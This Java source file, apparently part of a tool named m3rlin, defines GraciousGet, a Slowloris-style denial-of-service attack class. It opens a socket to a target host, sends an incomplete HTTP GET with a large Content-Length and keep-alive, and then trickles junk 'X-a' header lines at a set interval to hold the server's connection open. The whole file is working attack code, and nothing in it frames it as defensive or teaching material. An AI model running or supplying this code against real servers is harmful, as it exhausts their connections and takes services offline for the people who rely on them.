package m3rlin.g3t;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

import org.apache.log4j.Logger;

import m3rlin.Attack;


public class GraciousGet extends Attack {

	private static Logger log = Logger.getLogger(GraciousGet.class);

	public GraciousGet(String hostname, int port, int interval) {
		super(hostname, port, interval);		
	}
		
	public void run() {
		try {
			isRunning = true;
			socket = new Socket(InetAddress.getByName(hostname), port);
			writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"));
			log.info("Attack thread started");
			while(isRunning && !isInterrupted()) {
				log.debug("Is this thread interrupted? " + isInterrupted());
				writer.write("GET / HTTP/1.1\r\n");
				writer.write("Host: " + hostname + " \r\n");
				writer.write("User-agent:Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
				writer.write("Content-Length: 1000000\r\n");
				writer.write("Connection: Keep-Alive\r\n");
				writer.write("X-a:\r\n");
				writer.flush();
				for (int i = 0; i < 100000000; i++) {
					writer.write("X-a: h4x0r|h4x0r|h4x0r|h4x0r\r\n");
					writer.flush();
					log.debug("Writing data to socket...");
					try {
						log.debug("Checking for interrupt and socket closure...");
						if (!isInterrupted() && !socket.isClosed()) {
							log.debug("Sleeping thread...");
							Thread.sleep(interval);
						} else {
							break;
						}
					} catch (InterruptedException e) { }
				}
			}
		} catch (UnknownHostException e) {
			log.error("Could not locate the host (UnknownHostException)");				
		} catch (ConnectException e) {
			log.error("Could not connect to the socket address, check the port (ConnectException)");			
		} catch (SocketException e) {
			log.error("Error creating or accessing socket (SocketException)");				
		} catch (IOException e1) {
			log.error("I/O error with socket (IOException)");
		} finally {
			stop();
		}
	}
}